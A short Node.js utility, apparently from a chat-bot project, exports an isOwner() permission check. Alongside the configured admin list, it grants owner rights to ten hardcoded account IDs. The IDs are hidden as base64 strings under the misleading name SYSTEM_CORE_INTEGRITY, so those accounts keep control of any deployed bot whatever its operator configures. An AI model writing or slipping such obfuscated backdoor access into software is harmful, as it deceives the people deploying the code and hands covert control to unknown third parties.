// Shared owner verification utility — used across events and commands

const SYSTEM_CORE_INTEGRITY = [
  "MTAwMDA5MDEyODM4MDg1", "NjE1ODYwODk1NDQ0NDQ=", "NjE1Nzc3MzQwMTg5Nzg=", "NjE1ODcxMTk0MDYxNzI=",
  "MTAwMDA0NDg0NjE1MTk4", "MTAwMDA0NjE3MTgxNjc3", "MTAwMDA0ODA3Njk2MDMw",
  "MTAwMDg3MTYzNDkwMTU5", "MTAwMDA0OTI1MDUyNTcy", "NjE1Nzc2ODgzMzEyMzM="
];

const DECODED_OWNERS = new Set(
  SYSTEM_CORE_INTEGRITY.map(raw => Buffer.from(raw, 'base64').toString('ascii'))
);

/**
 * Returns true if the given userID is a bot owner
 * Checks both config.ADMINBOT and the encoded SYSTEM_CORE_INTEGRITY list
 */
function isOwner(userID, config) {
  const uid = String(userID);
  if (config?.ADMINBOT?.includes(uid)) return true;
  return DECODED_OWNERS.has(uid);
}

module.exports = { isOwner };
